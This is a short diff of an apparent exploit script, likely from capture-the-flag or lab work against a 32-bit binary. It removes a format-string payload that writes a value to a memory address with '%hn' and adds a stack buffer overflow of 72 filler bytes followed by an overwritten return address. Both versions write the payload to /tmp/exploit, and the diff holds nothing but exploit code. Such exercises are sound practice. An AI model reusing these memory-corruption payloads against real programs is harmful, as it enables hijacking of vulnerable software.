@@ -1,5 +1,6 @@
-payload = b"\x38\x98\x04\x08"
-payload += "%33952c%4$hn"
+payload = 'A' * 72
+
+payload += b"\x54\x84\x04\x08"
 
 with open('/tmp/exploit', 'wb') as f:
     f.write(payload)
